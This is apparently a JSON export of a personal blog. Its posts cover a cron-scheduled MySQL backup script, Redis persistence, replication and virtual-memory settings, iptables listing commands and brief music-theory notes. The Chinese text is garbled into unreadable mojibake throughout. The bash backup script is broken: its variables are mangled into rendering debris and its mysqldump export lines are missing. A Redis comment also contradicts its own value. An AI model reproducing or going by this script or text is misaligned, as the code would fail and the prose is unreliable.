ç”¨è„šæœ¬é…åˆè®¡åˆ’ä»»åŠ¡å®Œæˆçš„è‡ªåŠ¨å¤‡ä»½è¿œç¨‹çš„æ•°æ®åº“ã€‚ä¸€ã€ ç¡®è®¤å¤‡ä»½æ–¹æ¡ˆï¼šå¤‡ä»½æœºï¼šip192.168.8.51æ•°æ®åº“æœåŠ¡å™¨ï¼šip192.168.8.46å¤‡ä»½çš„å†…å®¹ï¼šå¯¹mysqlçš„studydbã€coursedbåº“è¿›è¡Œè¿œç¨‹å¤‡ä»½ã€æ¯å¤©2:30æ‰§è¡Œï¼Œæ¯ä¸ªåº“å¤‡ä»½ä¸ºç‹¬ç«‹çš„sqlæ–‡ä»¶ã€‚ç„¶åå‹ç¼©ä¸ºtar.gzæ ¼å¼ï¼Œæ–‡ä»¶ä¸­åµŒå…¥å¤‡ä»½çš„æ—¥æœŸå’Œæ—¶åˆ»ã€‚åˆ›å»ºæ•°æ®åº“ï¼š service mysqld statusmysqld (pid 3554) æ­£åœ¨è¿è¡Œâ€¦ mysqladmin -uroot -p password 123123 ##æ›´æ”¹å¯†ç Enter password: ##è¾“å…¥åŸå¯†ç  mysql -uroot -p123123Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 8Server version: 5.0.77-log Source distributionType â€˜help;â€™ or â€˜\\hâ€™ for help. Type â€˜\\câ€™ to clear the buffer.mysql&gt;mysql&gt; create database studydb; ##åˆ›å»ºæ•°æ®åº“Query OK, 1 row affected (0.05 sec)mysql&gt; create database couredb;Query OK, 1 row affected (0.00 sec)ç»™æ•°æ®åº“èµ‹æƒï¼šmysql&gt; grant select,lock tables on studydb.* to â€˜operatorâ€™@â€˜192.168.8.51â€™ identified by â€˜pwd123â€™; ##ä½¿ç”¨é€»è¾‘å·¥å…·å¤‡ä»½å·¥å…·mysqldumpæ˜¯éœ€è¦å¯¹åº“æœ‰selectå’Œlock tablesçš„æƒé™Query OK, 0 rows affected (0.00 sec)mysql&gt; grant select,lock tables on coursedb.* to â€˜operatorâ€™@â€˜192.168.8.51â€™ identified by â€˜pwd123â€™;Query OK, 0 rows affected (0.00 sec)åœ¨192.168.8.51æµ‹è¯•å¤‡ä»½ï¼š cd /tmp mysqldump -u operator -ppwd123 -h 192.168.8.46 --databases studydb &gt;test.sql lsbin games test.sqläºŒã€ åœ¨192.168.8.51ç¼–å†™Mysqlå¤‡ä»½è„šæœ¬ï¼š mkdir /root/bin cd /root/bin vi dbbak.sh#!/bin/bash#è¿™æ˜¯ä¸€ä¸ªç®€å•çš„mysqlæ•°æ®åº“é€»è¾‘å¤‡ä»½è„šæœ¬#1.å®šä¹‰æ•°æ®åº“è¿æ¥ã€ç›®æ ‡åº“ä¿¡æ¯MY_USER=â€œoperatorâ€MY_PASS=â€œpwd123â€MY_HOST=â€œ192.168.8.46â€MY_CONN=&quot;-u MYUSERâˆ’pMY_USER -pMYâ€‹Uâ€‹â€‹SERâˆ’pMY_PASS -h $MY_HOST&quot;MY_DB1=â€œstudydbâ€MY_DB2=â€œcoursedbâ€#2.å®šä¹‰å¤‡ä»½ç›®å½•ã€å·¥å…·ã€æ—¶é—´ã€æ–‡ä»¶åä¸»ä½“BF_DIR=&quot;/opt/dbbak/&quot;BF_CMD=&quot;/usr/local/bin/mysqldump&quot;BF_TIME=date +%Y%m%d-%H%MNAME_1=â€œMYDB1âˆ’MY_DB1-MYâ€‹Dâ€‹â€‹B1âˆ’BF_TIMEâ€NAME_2=â€œMYDB2âˆ’MY_DB2-MYâ€‹Dâ€‹â€‹B2âˆ’BF_TIMEâ€#3.å…ˆå¯¼å‡ºä¸º.sqlè„šæœ¬ï¼Œç„¶åå†è¿›è¡Œå‹ç¼©ï¼ˆæ‰“åŒ…ååˆ é™¤åŸæ–‡ä»¶ï¼‰cd $BF_DIR//bin/tar zcf $NAME_1.tar.gz $NAME_1.sql --remove &amp;&gt;/dev/null/bin/tar zcf $NAME_2.tar.gz $NAME_2.sql --remove &amp;&gt;/dev/null mkdir /opt/dbbak ###åˆ›å»ºå¤‡ä»½ç›®å½• chmod a+x dbbak.sh ###ç»™è„šæœ¬æ‰§è¡Œæƒé™ dbbak.sh ##è¿è¡Œè„šæœ¬ ls /opt/dbbak/ ###éªŒè¯æ•ˆæœcoursedb-20130505-0311.tar.gz studydb-20130505-0311.tar.gzä¸‰ã€ åœ¨192.168.8.51ä¸Šè®¾ç½®è®¡åˆ’ä»»åŠ¡ï¼š crontab -e30 2 * * * /root/bin/dbbak.sh chkconfig crond on service crond statuscrond (pid 3263) æ­£åœ¨è¿è¡Œâ€¦å¥½äº†æ•°æ®åº“å¤‡ä»½è¿™ä»¶äº‹å°±æå®šäº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"redisçš„æŒä¹…åŒ–","slug":"history/tech/5953c4d0c2b92f5665eed9c3","date":"2015-12-28T03:48:00.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c3/","excerpt":"","text":"redisçš„æŒä¹…åŒ–æœ‰rdbå’Œaofä¸¤ç§ã€‚rdbæ˜¯è®°å½•ä¸€æ®µæ—¶é—´å†…çš„æ“ä½œï¼Œä¸€ç›˜çš„é…ç½®æ˜¯ä¸€æ®µæ—¶é—´å†…æ“ä½œè¶…è¿‡å¤šå°‘æ¬¡å°±æŒä¹…åŒ–ã€‚aofå¯ä»¥å®ç°æ¯æ¬¡æ“ä½œéƒ½æŒä¹…åŒ–ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨aofã€‚é…ç½®æ–¹å¼ï¼Œæ‰“å¼€redisçš„é…ç½®æ–‡ä»¶ã€‚æ‰¾åˆ°appendonlyã€‚é»˜è®¤æ˜¯appendonly noã€‚æ”¹æˆappendonly yesã€‚å†æ‰¾åˆ°appendfsyncé»˜è®¤æ˜¯ï¼š appendfsync always #æ¯æ¬¡æ”¶åˆ°å†™å‘½ä»¤å°±ç«‹å³å¼ºåˆ¶å†™å…¥ç£ç›˜ï¼Œæœ€æ…¢çš„ï¼Œä½†æ˜¯ä¿è¯å®Œå…¨çš„æŒä¹…åŒ–ï¼Œä¸æ¨èä½¿ç”¨appendfsync everysec #æ¯ç§’é’Ÿå¼ºåˆ¶å†™å…¥ç£ç›˜ä¸€æ¬¡ï¼Œåœ¨æ€§èƒ½å’ŒæŒä¹…åŒ–æ–¹é¢åšäº†å¾ˆå¥½çš„æŠ˜ä¸­ï¼Œæ¨è appendfsync no #å®Œå…¨ä¾èµ–osï¼Œæ€§èƒ½æœ€å¥½,æŒä¹…åŒ–æ²¡ä¿è¯é»˜è®¤æ¯ç§’æŒä¹…åŒ–æ»¡è¶³æˆ‘çš„éœ€æ±‚ã€‚å…¶å®æ”¹ä¸‹appendonly å°±okäº†ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"æ²¡çœ‹æ‡‚çš„å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eed9c2","date":"2015-12-28T03:35:44.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c2/","excerpt":"","text":"firewall-cmd --list-all","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"iptbles","slug":"history/tech/5953c4d0c2b92f5665eed9c1","date":"2015-12-28T03:34:43.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c1/","excerpt":"","text":"iptables -L -n","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"éŸ³ç¨‹çš„è½¬ä½","slug":"history/music/5953c4d0c2b92f5665eed9c0","date":"2015-12-28T03:29:54.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5953c4d0c2b92f5665eed9c0/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5953c4d0c2b92f5665eed9c0/","excerpt":"","text":"3 è½¬ä½ 6å¤§ è½¬ä½ å°å° è½¬ä½ å¤§2 è½¬ä½ 7","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"},{"name":"åŸºæœ¬ä¹ç†","slug":"åŸºæœ¬ä¹ç†","permalink":"https://wangxiuwen.github.io/tags/%E5%9F%BA%E6%9C%AC%E4%B9%90%E7%90%86/"}],"author":"wangxiuwen"},{"title":"åå’Œ ä¸åå’Œ ä¸å®Œå…¨åå’Œ","slug":"history/music/5953c4d0c2b92f5665eed9bf","date":"2015-12-28T03:28:12.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5953c4d0c2b92f5665eed9bf/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5953c4d0c2b92f5665eed9bf/","excerpt":"","text":"å®Œå…¨åå’Œï¼š 1 8 4 5(çº¯)ä¸å®Œå…¨åå’Œï¼šï¼š å¤§å° ä¸‰åº¦ï¼Œ å¤§å° 6åº¦ä¸åå’Œï¼š å¤§å°2åº¦ï¼Œå¤§å°7åº¦ å¢4åº¦ï¼Œ å‡5åº¦","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"},{"name":"åŸºæœ¬ä¹ç†","slug":"åŸºæœ¬ä¹ç†","permalink":"https://wangxiuwen.github.io/tags/%E5%9F%BA%E6%9C%AC%E4%B9%90%E7%90%86/"}],"author":"wangxiuwen"},{"title":"é’¢ç´åŸºæœ¬åŠŸ","slug":"history/music/5953c4d0c2b92f5665eed9be","date":"2015-12-28T03:21:05.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/5953c4d0c2b92f5665eed9be/","link":"","permalink":"https://wangxiuwen.github.io/history/music/5953c4d0c2b92f5665eed9be/","excerpt":"","text":"æ‹œå„(beyer)è½¦å°”å°¼(Czerny) op595å“ˆå†œï¼ˆHanonï¼‰","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"},{"name":"åŸºæœ¬ä¹ç†","slug":"åŸºæœ¬ä¹ç†","permalink":"https://wangxiuwen.github.io/tags/%E5%9F%BA%E6%9C%AC%E4%B9%90%E7%90%86/"}],"author":"wangxiuwen"},{"title":"è™šæ‹Ÿå†…å­˜çš„ä½¿ç”¨","slug":"history/tech/5953c4d0c2b92f5665eed9bd","date":"2015-12-28T03:18:59.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9bd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9bd/","excerpt":"","text":"redisçš„è™šæ‹Ÿå†…å­˜ä¸æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿå†…å­˜ä¸æ˜¯ä¸€å›äº‹ï¼Œä½†æ˜¯æ€è·¯å’Œç›®çš„éƒ½æ˜¯ç›¸åŒçš„ã€‚å°±æ˜¯æŠŠæš‚æ—¶ä¸ç»å¸¸è®¿é—®çš„æ•°æ®ä»å†…å­˜äº¤æ¢åˆ°ç£ç›˜ä¸­ï¼Œä»è€Œè…¾å‡ºå®è´µçš„å†…å­˜ç©ºé—´ç”¨äºå…¶ä»–éœ€è¦è®¿é—®çš„æ•°æ®ï¼Œå°¤å…¶æ˜¯å¯¹äºredisè¿™æ ·çš„å†…å­˜æ•°æ®ï¼Œå†…å­˜æ€»æ˜¯ä¸å¤Ÿç”¨çš„ã€‚é™¤äº†å¯ä»¥å°†æ•°æ®åˆ†å‰²åˆ°å¤šä¸ªredis serverå¤–ï¼Œå¦å¤–èƒ½å¤Ÿæé«˜æ•°æ®åº“å®¹é‡çš„åŠæ³•å°±æ˜¯ä½¿ç”¨è™šæ‹Ÿå†…å­˜æŠŠé‚£äº›ä¸ç»å¸¸è®¿é—®çš„æ•°æ®äº¤æ¢åˆ°ç£ç›˜ä¸Šã€‚ä¸‹é¢æ˜¯vm ç›¸å…³é…ç½®ï¼švm-enable yes #å¼€å¯vmåŠŸèƒ½ vm-swap-file /tmp/redis.swap #äº¤æ¢å‡ºæ¥çš„valueä¿å­˜æ–‡ä»¶çš„è·¯å¾„ vm-max-memory 1000000 #redisä½¿ç”¨çš„æœ€å¤§å†…å­˜ä¸Šé™ vm-page-size 21 #æ¯ä¸ªé¡µé¢å¤§å°32å­—èŠ‚ vm-pages 134217728 #æœ€å¤šä½¿ç”¨å¤šå°‘é¡µé¢ vm-max-threads 4 #ç”¨äºæ‰§è¡Œvalueå¯¹è±¡çš„å·¥ä½œçº¿ç¨‹çš„æ•°é‡","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"å‘å¸ƒè®¢é˜…æ¶ˆæ¯","slug":"history/tech/5953c4d0c2b92f5665eed9bc","date":"2015-12-28T03:04:56.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9bc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9bc/","excerpt":"","text":"å‘å¸ƒè®¢é˜…(pub/sub)æ˜¯ä¸€ç§æ¶ˆæ¯é€šä¿¡æ¨¡å¼ï¼Œä¸»è¦çš„ç›®åœ°æ˜¯è§£é™¤æ¶ˆæ¯å‘å¸ƒç€å’Œæ¶ˆæ¯è®¢é˜…è€…ä¹‹é—´çš„è€¦åˆï¼Œredisä½œä¸ºä¸€ä¸ªpub/subçš„serverï¼Œåœ¨è®¢é˜…è€…å’Œå‘å¸ƒè€…ä¹‹é—´èµ·åˆ°äº†æ¶ˆæ¯è·¯ç”±çš„åŠŸèƒ½ã€‚è®¢é˜…è€…å¯ä»¥è£å›½subcribeå’Œpsubscribeå‘½ä»¤å‘redis server è®¢é˜…è‡ªå·±æ„Ÿå…´è¶£çš„æ¶ˆæ¯ç±»å‹ï¼Œrediså°†ä¿¡æ¯ç±»å‹ç§°ä¸ºé€šé“(channel)ã€‚å½“å‘å¸ƒè€…é€šè¿‡publishå‘½ä»¤å‘redis serverå‘é€ç‰¹å®šç±»å‹çš„ä¿¡æ¯æ—¶ï¼Œè®¢é˜…è¯¥ä¿¡æ¯ç±»å‹çš„å…¨éƒ¨clientéƒ½ä¼šæ”¶åˆ°æ­¤æ¶ˆæ¯ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"rediså®¢æˆ·ç«¯è¿æ¥","slug":"history/tech/5953c4d0c2b92f5665eed9bb","date":"2015-12-28T03:01:10.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9bb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9bb/","excerpt":"","text":"/usr/local/redis/bin/redis-cli -a password","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"rediså¯åŠ¨æ–¹å¼","slug":"history/tech/5953c4d0c2b92f5665eed9ba","date":"2015-12-28T03:00:31.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ba/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ba/","excerpt":"","text":"/usr/local/redis/bin/redis-server /usr/local/reids/etc/redis.conf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"redisåœæ­¢æ–¹å¼","slug":"history/tech/5953c4d0c2b92f5665eed9b9","date":"2015-12-28T02:59:51.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b9/","excerpt":"","text":"æš´åŠ›æ–¹å¼ï¼špkill redis-server","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"æŒä¹…åŒ–æœºåˆ¶","slug":"history/tech/5953c4d0c2b92f5665eed9b8","date":"2015-12-28T02:24:07.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b8/","excerpt":"","text":"redisæ˜¯ä¸€ä¸ªæ”¯æŒæŒä¹…åŒ–çš„å†…å­˜æ•°æ®åº“ï¼Œä¹Ÿå°±æ˜¯è¯´rediséœ€è¦ç»å¸¸å°†å†…å­˜ä¸­çš„æ•°æ®åŒæ­¥åˆ°ç¡¬ç›˜æ¥ä¿è¯æŒä¹…åŒ–ã€‚redisåƒåƒä¸¤ç§æŒä¹…åŒ–æ–¹å¼ï¼š1.snapshotting(å¿«ç…§)ä¹Ÿæ˜¯é»˜è®¤æ–¹å¼ã€‚2.Append-only file(ç¼©å†™aof)çš„æ–¹å¼ã€‚snapshottingï¼šå¿«ç…§æ˜¯é»˜è®¤çš„æŒä¹…åŒ–æ–¹å¼ã€‚è¿™ç§æ–¹å¼æ˜¯å°†å†…å­˜ä¸­æ•°æ®ä»¥å¿«ç…§çš„æ–¹å¼å†™å…¥åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œé»˜è®¤çš„æ–‡ä»¶åä¸ºdump.rdbã€‚å¯ä»¥é€šè¿‡é…ç½®è®¾ç½®è‡ªåŠ¨å¿«ç…§æŒä¹…åŒ–çš„æ–¹å¼ã€‚æˆ‘ä»¬å¯ä»¥é…ç½®redisåœ¨nç§’å†…å¦‚æœè¶…è¿‡mä¸ªkeyä¿®æ”¹å°±è‡ªåŠ¨åšå¿«ç…§ã€‚save 900 1#900ç§’å†…å¦‚æœè¶…è¿‡1ä¸ªkeyè¢«ä¿®æ”¹ï¼Œåˆ™å‘èµ·å¿«ç…§ä¿å­˜save 300 1#300ç§’å†…å¦‚æœè¶…è¿‡10ä¸ªkeyè¢«ä¿®æ”¹ï¼Œåˆ™å‘èµ·å¿«ç…§ä¿å­˜save 60 10000aof æ–¹å¼ï¼šç”±äºå¿«ç…§æ˜¯æŒ‰ç…§ä¸€å®šæ—¶é—´é—´éš”åšä¸€æ¬¡çš„ï¼Œæ‰€ä»¥å¦‚æœredisæ„å¤–downæ‰çš„è¯ï¼Œå°±ä¼šä¸¢å¤±æœ€åä¸€æ¬¡å¿«ç…§åçš„æ‰€æœ‰ä¿®æ”¹ã€‚aofæ¯”å¿«ç…§æ–¹å¼æœ‰æ›´å¥½çš„æŒä¹…åŒ–æ€§ï¼Œæ˜¯ç”±äºåœ¨ä½¿ç”¨aofæ—¶ï¼Œredisä¼šå°†æ¯ä¸€ä¸ªæ”¶åˆ°çš„å†™å‘½ä»¤éƒ½é€šè¿‡writeå‡½æ•°è¿½åŠ åˆ°æ–‡ä»¶ä¸­ï¼Œå½“redisé‡å¯æ—¶ä¼šé€šè¿‡é‡æ–°æ‰§è¡Œæ–‡ä»¶ä¸­ä¿å­˜çš„å†™å‘½ä»¤æ¥åœ¨å†…å­˜ä¸­é‡å»ºæ•´ä¸ªæ•°æ®åº“çš„å†…å®¹ã€‚å½“ç„¶ç”±äºosä¼šåœ¨å†…æ ¸ä¸­ç¼“å­˜writeåšçš„ä¿®æ”¹ï¼Œæ‰€ä»¥å¯èƒ½ä¸æ˜¯ç«‹å³å†™åˆ°ç£ç›˜ä¸Šï¼Œè¿™æ ·aofæ–¹å¼çš„æŒä¹…åŒ–ä¹Ÿè¿˜æ˜¯æœ‰å¯èƒ½ä¼šä¸¢å¤±éƒ¨åˆ†ä¿®æ”¹ã€‚å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶å‘Šè¯‰redisæˆ‘ä»¬æƒ³è¦fsyncå‡½æ•°å¼ºåˆ¶oså†™å…¥ç£ç›˜çš„æ—¶æœºã€‚appendonly yes //å¯åŠ¨aofæŒä¹…åŒ–æ–¹å¼#appendfsync always //æ”¶åˆ°å†™å‘½ä»¤å°±ç«‹å³å†™å…¥ç£ç›˜ï¼Œæœ€æ…¢ï¼Œä½†æ˜¯ä¿è¯å®Œå…¨æŒä¹…åŒ–ã€‚appendfsync everysec//æ¯ç§’é’Ÿå†™å…¥ç£ç›˜ä¸€æ¬¡ï¼Œåœ¨æ€§èƒ½å’ŒæŒä¹…åŒ–æ–¹é¢åšäº†å¾ˆå¥½çš„æŠ˜ä¸­ã€‚#appendfsync no//å®Œå…¨ä¾èµ–osï¼Œæ€§èƒ½æœ€å¥½ï¼ŒæŒä¹…åŒ–æ²¡ä¿è¯ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"ä¸»ä»å¤åˆ¶","slug":"history/tech/5953c4d0c2b92f5665eed9b7","date":"2015-12-28T02:17:08.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b7/","excerpt":"","text":"é…ç½®ä¸»ä»æœåŠ¡å™¨ï¼šé…ç½®slaveæœåŠ¡å™¨å¾ˆç®€å•ï¼Œåªéœ€è¦åœ¨slaveçš„é…ç½®æ–‡ä»¶ä¸­åŠ å…¥æ­¤é…ç½®ï¼šslaveof 192.168.1.1 6379 #æ‰§è¡Œmasterçš„ipå’Œç«¯å£masterauth password #è¿™æ˜¯ä¸»æœºçš„å¯†ç ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"set ç±»å‹åŠå…¶æ“ä½œ","slug":"history/tech/5953c4d0c2b92f5665eed9b6","date":"2015-12-28T02:11:28.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b6/","excerpt":"","text":"setæ˜¯é›†åˆï¼Œä»–æ˜¯stringç±»å‹çš„æ— åºé›†åˆã€‚setæ˜¯é€šè¿‡hash table å®ç°çš„ï¼Œæ·»åŠ ï¼Œåˆ é™¤å’ŒæŸ¥æ‰¾çš„å¤æ‚åº¦éƒ½æ˜¯O(1)ã€‚å¯¹é›†åˆæˆ‘ä»¬å¯ä»¥å–å¹¶é›†ï¼Œäº¤é›†ï¼Œå·®é›†ã€‚é€šè¿‡è¿™äº›æ“ä½œæˆ‘ä»¬å¯ä»¥å®ç°snsä¸­çš„å¥½å‹æ¨èå’Œblogå’ŒtagåŠŸèƒ½ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"redis","slug":"redis","permalink":"https://wangxiuwen.github.io/tags/redis/"}],"author":"wangxiuwen"},{"title":"setrange","slug":"history/tech/5953c4d0c2b92f5665eed9b5","date":"2015-12-28T02:09:17.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9b5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9b5/","excerpt":"","text":"è®¾ç½®æŒ‡å®šçš„keyçš„valueå€¼çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼šæˆ‘ä»¬å¸Œæœ›å°†zhangsançš„126é‚®ç®±æ›¿æ¢ä¸ºgmailé‚®ç®±ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æ